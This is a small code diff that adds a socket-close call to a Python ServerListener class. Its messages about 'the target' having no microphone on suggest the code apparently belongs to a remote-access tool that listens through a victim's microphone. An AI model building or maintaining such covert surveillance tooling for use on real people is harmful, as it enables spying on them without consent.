@@ -42,6 +42,7 @@ class ServerListener:
             check = 0
             full_msg = ServerPhotos.get_data(self, client_socket, "r", 30000000)
             listening_data.close()
+            client_socket.close()
             if full_msg == "THE TARGET HAS NO MICROPHONE ON":
                 bp.color("\nTHE TARGET HAS NO MICROPHONE ON\n", "green")
                 bp.color('"ServerListener" will be destroyed', "green")
